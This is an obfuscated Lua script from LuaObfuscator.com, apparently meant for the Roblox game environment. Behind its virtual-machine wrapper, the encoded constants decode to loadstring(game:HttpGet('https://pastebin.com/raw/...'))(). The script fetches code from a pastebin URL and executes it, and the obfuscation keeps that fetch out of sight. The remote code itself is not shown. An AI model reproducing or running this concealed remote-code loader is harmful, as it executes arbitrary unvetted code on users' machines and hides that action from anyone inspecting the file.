--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v84=0;while true do if (v84==0) then v19=v0(v3(v30,1,1));return "";end end else local v85=v2(v0(v30,16));if v19 then local v91=0;local v92;while true do if (v91==1) then return v92;end if (v91==0) then v92=v5(v85,v19);v19=nil;v91=1;end end else return v85;end end end);local function v20(v31,v32,v33) if v33 then local v86=0;local v87;while true do if (v86==(0 -0)) then v87=(v31/((5 -3)^(v32-1)))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + (1711 -(1523 + 114)))))) ;return v87-(v87%(569 -(330 + 37 + 201))) ;end end else local v88=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v88 + v88))>=v88) and ((1 -0) + 0)) or (877 -(282 + 595)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=1065 -(68 + 997) ;local v36;local v37;while true do if (v35==(1271 -(226 + 1044))) then return (v37 * ((104 -47) + 199)) + v36 ;end if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (119 -(32 + 85)) );v18=v18 + 2 ;v35=1;end end end local function v23() local v38=0;local v39;local v40;local v41;local v42;while true do if (v38==(1 -0)) then return (v42 * 16777216) + (v41 * ((261863 -195977) -(87 + 263))) + (v40 * 256) + v39 ;end if ((180 -((1019 -(802 + 150)) + 113))==v38) then v39,v40,v41,v42=v1(v16,v18,v18 + 3 + 0 );v18=v18 + (9 -5) ;v38=1 + 0 ;end end end local function v24() local v43=0 -0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if ((3 -(1914 -(1789 + 124)))==v43) then v48=v20(v45,16 + 5 ,1028 -(915 + 82) );v49=((v20(v45,90 -58 )==(773 -(201 + 571))) and  -1) or (1 + 0) ;v43=1141 -(116 + 1022) ;end if (v43==3) then if (v48==(0 -0)) then if (v47==(0 + 0)) then return v49 * (766 -(745 + 21)) ;else local v101=0;while true do if (v101==(1187 -(1069 + 118))) then v48=(1 + 1) -1 ;v46=0 -(0 -0) ;break;end end end elseif (v48==((1396 -1040) + 1691)) then return ((v47==(0 -0)) and (v49 * ((1 + 0)/(791 -(368 + 4 + 419))))) or (v49 * NaN) ;end return v8(v49,v48-(3214 -2191) ) * (v46 + (v47/(((16 + 4) -((1065 -(87 + 968)) + 8))^(199 -147)))) ;end if (v43==(442 -(416 + 26))) then v44=v23();v45=v23();v43=3 -2 ;end if (v43==(3 -2)) then v46=1 + 0 ;v47=(v20(v45,1 + 0 ,35 -15 ) * ((1749 -(760 + 987))^32)) + v44 ;v43=2;end end end local function v25(v50) local v51;if  not v50 then v50=v23();if (v50==(0 -0)) then return "";end end v51=v3(v16,v18,(v18 + v50) -(1 + 0) );v18=v18 + v50 ;local v52={};for v67=2 -1 , #v51 do v52[v67]=v2(v1(v3(v51,v67,v67)));end return v6(v52);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 0;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do local v69=(function() return 0;end)();while true do if (v69==(0 + 0)) then local v93=(function() return 0 -0 ;end)();while true do if (v93~=1) then else v69=(function() return 1;end)();break;end if (0==v93) then if (v53~=(1 -0)) then else v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v60=(function() return {};end)();for v110= #"~",v59 do local v111=(function() return 0;end)();local v112=(function() return;end)();local v113=(function() return;end)();local v114=(function() return;end)();while true do if (v111~=(2 -1)) then else v114=(function() return nil;end)();while true do if (v112==(285 -(134 + 151))) then local v168=(function() return 0;end)();while true do if (v168~=(1665 -(970 + 695))) then else v113=(function() return v21();end)();v114=(function() return nil;end)();v168=(function() return 1;end)();end if (v168==1) then v112=(function() return 1;end)();break;end end end if (v112==1) then if (v113== #"~") then v114=(function() return v21()~=(0 -0) ;end)();elseif (v113==(1992 -(582 + 1408))) then v114=(function() return v24();end)();elseif (v113== #"19(") then v114=(function() return v25();end)();end v60[v110]=(function() return v114;end)();break;end end break;end if (v111==0) then v112=(function() return 0;end)();v113=(function() return nil;end)();v111=(function() return 1;end)();end end end v53=(function() return 2;end)();end if (v53==0) then local v105=(function() return 0 -0 ;end)();while true do if (v105==(2 -0)) then v53=(function() return 1;end)();break;end if (v105==1) then v56=(function() return {};end)();v57=(function() return {};end)();v105=(function() return 7 -5 ;end)();end if (v105==(1824 -(1195 + 629))) then v54=(function() return function(v160,v161,v162) local v163=(function() return 0;end)();while true do if (v163==0) then local v170=(function() return 0 -0 ;end)();while true do if (0~=v170) then else v160[v161-#":" ]=(function() return v162();end)();return v160,v161,v162;end end end end end;end)();v55=(function() return {};end)();v105=(function() return 242 -(187 + 54) ;end)();end end end v93=(function() return 781 -(162 + 618) ;end)();end end end if (v69==1) then if (v53~=2) then else v58[ #"nil"]=(function() return v21();end)();for v102= #"}",v23() do local v103=(function() return v21();end)();if (v20(v103, #"|", #":")==0) then local v106=(function() return 0 + 0 ;end)();local v107=(function() return;end)();local v108=(function() return;end)();local v109=(function() return;end)();while true do if (1~=v106) then else local v146=(function() return 0;end)();while true do if (0~=v146) then else local v167=(function() return 0;end)();while true do if (v167==(0 + 0)) then v109=(function() return {v22(),v22(),nil,nil};end)();if (v107==0) then local v172=(function() return 0;end)();local v173=(function() return;end)();while true do if (v172==0) then v173=(function() return 0 -0 ;end)();while true do if (v173==(0 + 0)) then v109[ #"nil"]=(function() return v22();end)();v109[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v107== #">") then v109[ #"91("]=(function() return v23();end)();elseif (v107==2) then v109[ #"91("]=(function() return v23() -(2^16) ;end)();elseif (v107== #"asd") then local v178=(function() return 0;end)();local v179=(function() return;end)();while true do if (v178==(1636 -(1373 + 263))) then v179=(function() return 0;end)();while true do if (v179==(1000 -(451 + 549))) then v109[ #"91("]=(function() return v23() -(2^16) ;end)();v109[ #"0313"]=(function() return v22();end)();break;end end break;end end end v167=(function() return 1;end)();end if (v167~=1) then else v146=(function() return 1;end)();break;end end end if (v146==1) then v106=(function() return 1 + 1 ;end)();break;end end end if ((4 -1)~=v106) then else if (v20(v108, #"nil", #"gha")== #"!") then v109[ #"http"]=(function() return v60[v109[ #"asd1"]];end)();end v55[v102]=(function() return v109;end)();break;end if ((0 -0)==v106) then local v148=(function() return 1384 -(746 + 638) ;end)();local v149=(function() return;end)();while true do if ((0 + 0)~=v148) then else v149=(function() return 0 -0 ;end)();while true do if (v149==(342 -(218 + 123))) then v106=(function() return 1582 -(1535 + 46) ;end)();break;end if (v149==(0 + 0)) then v107=(function() return v20(v103,1 + 1 , #"asd");end)();v108=(function() return v20(v103, #"xnxx",566 -(306 + 254) );end)();v149=(function() return 1 + 0 ;end)();end end break;end end end if (v106~=(3 -1)) then else if (v20(v108, #".", #",")~= #"<") then else v109[2]=(function() return v60[v109[2]];end)();end if (v20(v108,1469 -(899 + 568) ,2)== #".") then v109[ #"nil"]=(function() return v60[v109[ #"xnx"]];end)();end v106=(function() return 3;end)();end end end end for v104= #".",v23() do v56,v104,v28=(function() return v54(v56,v104,v28);end)();end return v58;end break;end end end end local function v29(v61,v62,v63) local v64=v61[(3 -2) + 0 ];local v65=v61[4 -2 ];local v66=v61[3];return function(...) local v70=v64;local v71=v65;local v72=v66;local v73=v27;local v74=604 -(268 + (1547 -(323 + 889))) ;local v75= -1;local v76={};local v77={...};local v78=v12("#",...) -(573 -(426 + 146)) ;local v79={};local v80={};for v89=0 + 0 ,v78 do if ((2460<=3134) and (v89>=v72)) then v76[v89-v72 ]=v77[v89 + 1 ];else v80[v89]=v77[v89 + (1457 -(282 + 1174)) ];end end local v81=(v78-v72) + (812 -((1149 -(361 + 219)) + 242)) ;local v82;local v83;while true do local v90=0 -0 ;while true do if ((v90==(1 + 0)) or (3275>=4794)) then if (v83<=(1027 -(706 + 318))) then if (v83<=(1252 -(721 + 530))) then if ((1484==1484) and (v83==(1271 -(945 + 326)))) then v80[v82[4 -2 ]]={};else v80[v82[2]]();end elseif (v83>(2 + 0)) then do return;end else local v116;local v117,v118;local v119;local v120;v80[v82[2]]={};v74=v74 + (701 -(271 + 429)) ;v82=v70[v74];v80[v82[2 + 0 ]]=v63[v82[1503 -(1408 + 92) ]];v74=v74 + (1087 -((781 -(53 + 267)) + 625)) ;v82=v70[v74];v80[v82[1290 -(993 + 295) ]]=v63[v82[1 + 2 ]];v74=v74 + (1172 -(418 + 753)) ;v82=v70[v74];v120=v82[1 + 1 ];v119=v80[v82[1 + 2 ]];v80[v120 + 1 + 0 ]=v119;v80[v120]=v119[v82[2 + 2 ]];v74=v74 + 1 ;v82=v70[v74];v80[v82[(120 + 411) -((819 -(15 + 398)) + 123) ]]=v82[1772 -(1749 + 20) ];v74=v74 + 1 + 0 ;v82=v70[v74];v120=v82[2];v117,v118=v73(v80[v120](v13(v80,v120 + ((2305 -(18 + 964)) -(1249 + 73)) ,v82[2 + 1 ])));v75=(v118 + v120) -(1146 -(466 + 679)) ;v116=(0 -0) -(0 + 0) ;for v150=v120,v75 do v116=v116 + (2 -1) ;v80[v150]=v117[v116];end v74=v74 + (1901 -(106 + 1794)) ;v82=v70[v74];v120=v82[2];v80[v120]=v80[v120](v13(v80,v120 + 1 + 0 ,v75));v74=v74 + 1 + 0 + 0 ;v82=v70[v74];v80[v82[2]]();v74=v74 + ((852 -(20 + 830)) -1) ;v82=v70[v74];do return;end end elseif ((1432<3555) and (v83<=(13 -8))) then if (v83==((93 + 25) -((130 -(116 + 10)) + 110))) then local v135=v82[586 -(57 + 527) ];v80[v135]=v80[v135](v13(v80,v135 + (1428 -(41 + 1386)) ,v75));else local v137=v82[105 -(17 + 86) ];local v138=v80[v82[3 + 0 ]];v80[v137 + (1 -0) ]=v138;v80[v137]=v138[v82[4]];end elseif ((v83<=6) or (1483==1830)) then local v142=v82[5 -3 ];local v143,v144=v73(v80[v142](v13(v80,v142 + (167 -(122 + 44)) ,v82[3])));v75=(v144 + v142) -(1 -0) ;local v145=0 -0 ;for v153=v142,v75 do v145=v145 + 1 ;v80[v153]=v143[v145];end elseif (v83>(6 + 1)) then v80[v82[2]]=v82[1 + 2 ];else v80[v82[2]]=v63[v82[3]];end v74=v74 + (1 -0) ;break;end if ((v90==(65 -(30 + 35))) or (3082==3612) or (1065>3578)) then v82=v70[v74];v83=v82[1 + 0 ];v90=1258 -(1043 + 214) ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F747A673455454B6900094Q00027Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
